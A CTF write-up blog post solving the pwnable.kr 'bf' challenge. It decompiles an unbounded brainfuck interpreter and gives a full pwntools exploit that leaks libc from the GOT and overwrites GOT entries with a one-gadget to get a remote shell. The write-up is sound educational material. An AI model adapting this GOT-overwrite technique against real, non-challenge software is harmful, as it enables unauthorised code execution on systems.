---
layout: post
title: pwnable.kr - bf writeup
---
> **brain fuck - 150 pt**
> 
> I made a simple brain-fuck language emulation program written in C. 
> The [ ] commands are not implemented yet. However the rest functionality seems working fine. 
> Find a bug and exploit it to get a shell. 
>
> 
> Download : http://pwnable.kr/bin/bf
> 
> Download : http://pwnable.kr/bin/bf_libc.so
>
> 
> Running at : nc pwnable.kr 9001

First, download the binary and decompile it (I used Ghidra for this). We can see that it's a simple implementation of a brainfuck interpreter. However, there are no bounds checks, so we can read and write to basically wherever we want as long as the code for it isn't too long (as the `[]` instructions aren't available in this version).
```c

undefined4 main(void)

{
  size_t sVar1;
  int in_GS_OFFSET;
  uint local_418;
  char local_414 [1024];
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,1,0);
  p = tape;
  puts("welcome to brainfuck testing system!!");
  puts("type some brainfuck instructions except [ ]");
  memset(local_414,0,0x400);
  fgets(local_414,0x400,stdin);
  local_418 = 0;
  while( true ) {
    sVar1 = strlen(local_414);
    if (sVar1 <= local_418) break;
    do_brainfuck((int)local_414[local_418]);
    local_418 = local_418 + 1;
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
```c

void do_brainfuck(undefined param_1)

{
  char *pcVar1;
  int iVar2;
  
  pcVar1 = p;
  switch(param_1) {
  case 0x2b:
    *p = *p + 1;
    break;
  case 0x2c:
    iVar2 = getchar();
    *pcVar1 = (char)iVar2;
    break;
  case 0x2d:
    *p = *p + -1;
    break;
  case 0x2e:
    putchar((int)*p);
    break;
  case 0x3c:
    p = p + -1;
    break;
  case 0x3e:
    p = p + 1;
    break;
  case 0x5b:
    puts("[ and ] not supported.");
  }
  return;
}

```
We can see from `pwn checksec` that we have a writable GOT, and that PIE is off:
```bash
$ pwn checksec ./bf
[*] '/home/user/ctf/ctf-solutions/pwnable-kr/bf/bf'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
So we can write to the GOT. Now we just have to figure out where, and what. I couldn't find a simple way to call `system` directly, so I searched for one-gadgets:
```bash
$ one_gadget bf_libc.so
0x3ac6c execve("/bin/sh", esp+0x28, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x28] == NULL

0x3ac6e execve("/bin/sh", esp+0x2c, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x2c] == NULL

0x3ac72 execve("/bin/sh", esp+0x30, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x30] == NULL

0x3ac79 execve("/bin/sh", esp+0x34, environ)
constraints:
  esi is the GOT address of libc
  [esp+0x34] == NULL

0x5fbd5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL

0x5fbd6 execl("/bin/sh", [esp])
constraints:
  esi is the GOT address of libc
  [esp] == NULL
```
I ran through the main function in GDB and it turns out that the conditions are just right for the gadget at 0x5fbd5 to get a shell if I replaced the GOT address of puts with the gadget. So then we just have to get `_start` called from somewhere (because otherwise the `esi` constraint won't be satisfied if we directly call `main`). I chose `putchar` because we can choose when we want to call it through the brainfuck code and because `getchar` is already being used for writing data.

Finally, to get a libc leak, we can just simply read off the GOT with some brainfuck code. Do be careful to make sure `putchar` is resolved before trying to leak it, which we can do by printing out some random character before our exploit. Also, we have to use the `,` instruction instead of the `+`/`-` instructions here because we don't know what bytes we need to write before the libc leak.

Full exploit code: 
```python3
# leak libc base
# write one-gadget to puts got 
'''
0x5fbd5 execl("/bin/sh", eax)
constraints:
  esi is the GOT address of libc
  eax == NULL
'''
# jump back to __libc_start_main with another got overwrite 
from pwn import *
context.log_level = 'debug'
e = ELF('./bf')
libc = ELF('./bf_libc.so')
#r = process('./bf_patched')
r = remote('pwnable.kr', 9001)
#r = gdb.debug('./bf_patched', 'b main\nc')
r.recvuntil(b']\n')
r.sendline(b'.'+b'<'*(e.sym['tape']-e.got['putchar'])+b'.>'*4+b'<'*4+b',>'*4+b'<'*(e.got['putchar']+4-e.got['puts'])+b',>'*4+b'.')
# make sure putchar is resolved first 
r.recv(1)
leak = u32(r.recv(4))
print('putchar@got =', hex(leak))
libc.address = leak - libc.sym['putchar']
print('libc.address =', hex(libc.address))
# putchar -> __libc_start_main(main), puts -> one-gadget
r.send(p32(e.sym['_start']))
r.send(p32(libc.address + 0x5fbd5))
r.interactive()
```
And with that, we get a shell.

All of the files for this challenge are available at <https://github.com/programmeruser2/ctf-solutions/tree/main/pwnable-kr/bf>.

